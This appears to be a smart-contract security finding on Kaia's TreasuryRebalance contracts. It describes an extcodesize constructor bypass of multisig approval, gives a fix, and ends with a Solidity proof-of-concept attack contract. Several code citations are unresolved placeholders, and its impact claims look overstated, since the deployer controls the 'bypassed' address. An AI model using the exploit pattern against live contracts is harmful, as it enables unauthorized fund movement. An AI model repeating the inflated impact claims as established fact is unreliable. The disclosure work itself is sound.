### Title
`isContractAddr` Constructor Bypass Allows Single-Party Approval of Multisig Zeroed Address, Enabling Unauthorized Treasury Rebalance Execution — (`contracts/testing/system_contracts/TreasuryRebalanceV2.sol`, `contracts/testing/system_contracts/TreasuryRebalance.sol`)

---

### Summary

Both `TreasuryRebalance.sol` (KIP-103) and `TreasuryRebalanceV2.sol` (KIP-160) use `isContractAddr()` — implemented via `extcodesize` — to decide whether a zeroed/retired address must satisfy a multisig quorum or a simple EOA self-approval. Because `extcodesize` returns 0 during a contract's constructor execution, a contract calling `approve(address(this))` from its own constructor is misclassified as an EOA. The single-party EOA check (`msg.sender == _zeroedAddress`) then passes trivially, recording the contract's own address as the sole approver. When `finalizeApproval()` later calls `checkZeroedsApproved()`, the contract is now fully deployed so `isContractAddr` returns `true`; if the contract's `getState()` returns itself as the only admin with `req = 1`, the quorum check passes. The Kaia core then executes `RebalanceTreasury`, zeroing the balance of the registered address via `state.SetBalance(addr, big.NewInt(0))` — an irreversible burn of KAIA — without the required number of multisig admin approvals.

---

### Finding Description

**Root cause — `isContractAddr` uses `extcodesize`:** [1](#0-0) 

`extcodesize` returns 0 for any address whose constructor is still executing, so a contract calling into `approve()` during its own constructor is indistinguishable from an EOA.

**Vulnerable branch in `approve()` (KIP-160 / `TreasuryRebalanceV2.sol`):** [2](#0-1) 

When `isContractAddr(_zeroedAddress)` returns `false`, the only guard is:

```solidity
require(msg.sender == _zeroedAddress, "zeroedAddress is not the msg.sender");
```

During a constructor call, `msg.sender` is the contract's own address, so `msg.sender == _zeroedAddress` is trivially satisfied.

**Identical pattern in KIP-103 / `TreasuryRebalance.sol`:** [3](#0-2) 

**`checkZeroedsApproved()` re-evaluates `isContractAddr` at finalization time:** [4](#0-3) 

By the time `finalizeApproval()` is called, the constructor has finished and the contract has code, so `isContractAddr` now returns `true`. The quorum check then calls `_getState(zeroed.addr)` on the deployed contract. If the malicious contract's `getState()` returns `[address(this)]` with `req = 1`, the single approver recorded during the constructor call satisfies the quorum.

**Core execution path — `RebalanceTreasury`:** [5](#0-4) 

After `CheckZeroedsApproved` passes, the core unconditionally zeroes every registered address's balance with `state.SetBalance(addr, big.NewInt(0))`.

---

### Impact Explanation

A contract registered as a zeroed address can bypass the multisig quorum requirement and self-approve the burning of its entire KAIA balance. The treasury rebalance then executes at the KIP-103 or KIP-160 hard-fork block, permanently zeroing the balance of the registered address and distributing funds to allocated addresses — all without the required number of legitimate admin signatures. This is an unauthorized burn of KAIA from a system-managed fund address.

---

### Likelihood Explanation

The attack requires the governance owner to register a pre-computed CREATE2 address as a zeroed address before the contract at that address is deployed. This is a realistic scenario: the owner may register a future treasury contract address during the rebalance setup phase, and the party responsible for deploying that contract controls the constructor code. The owner's registration action is legitimate; the exploit is in the constructor of the deployed contract. The attack is deterministic and requires no brute-force or cryptographic break.

---

### Recommendation

Replace the `extcodesize`-based `isContractAddr` check with a persistent flag set at registration time. When `registerZeroed` (or `registerRetired`) is called, record whether the address currently has code:

```solidity
struct Zeroed {
    address addr;
    address[] approvers;
    bool isContract; // set once at registration time
}

function registerZeroed(address _zeroedAddress) external onlyOwner onlyAtStatus(Status.Initialized) {
    ...
    zeroed.isContract = _isContractAddr(_zeroedAddress);
    ...
}
```

Use `zeroed.isContract` (not a live `extcodesize` call) in both `approve()` and `checkZeroedsApproved()`. This eliminates the constructor-bypass window entirely. Alternatively, require that all zeroed addresses already have deployed code at registration time.

```solidity
pragma solidity 0.8.19;

interface ITreasuryRebalanceV2 {
    function approve(address _zeroedAddress) external;
}

/**
 * MaliciousZeroed is deployed at a CREATE2 address that the owner
 * has already registered as a zeroed address and moved to Registered status.
 *
 * Attack steps:
 * 1. Owner calls registerZeroed(predictedAddress) where predictedAddress
 *    is the CREATE2 address of this contract.
 * 2. Owner calls finalizeRegistration().
 * 3. Attacker deploys MaliciousZeroed via CREATE2 at predictedAddress.
 *    The constructor calls approve(address(this)) on TreasuryRebalanceV2.
 *    - isContractAddr(address(this)) returns false (extcodesize == 0 in constructor)
 *    - EOA branch: require(msg.sender == _zeroedAddress) passes
 *    - address(this) is pushed into zeroeds[i].approvers
 * 4. Owner calls finalizeApproval().
 *    - checkZeroedsApproved() calls isContractAddr(address(this)) → true (now deployed)
 *    - _getState(address(this)) returns ([address(this)], 1)
 *    - validApprovals = 1 >= req = 1 → PASSES
 * 5. At the rebalance block, RebalanceTreasury() executes:
 *    state.SetBalance(address(this), 0)  ← KAIA burned without multisig consent
 */
contract MaliciousZeroed {
    address[] private _admins;
    uint256 private _req;

    constructor(address treasuryRebalance) {
        // Make getState() return [address(this)] with req=1
        _admins.push(address(this));
        _req = 1;

        // During construction: extcodesize(address(this)) == 0
        // → isContractAddr returns false → EOA branch taken
        // → msg.sender == address(this) == _zeroedAddress → passes
        ITreasuryRebalanceV2(treasuryRebalance).approve(address(this));
    }

    // Called by checkZeroedsApproved() after deployment
    function getState() external view returns (address[] memory, uint256) {
        return (_admins, _req);
    }
}
```

After step 5, `state.GetBalance(maliciousZeroedAddress)` returns `0` — the entire KAIA balance of the registered address has been burned without any legitimate multisig admin approving the rebalance.
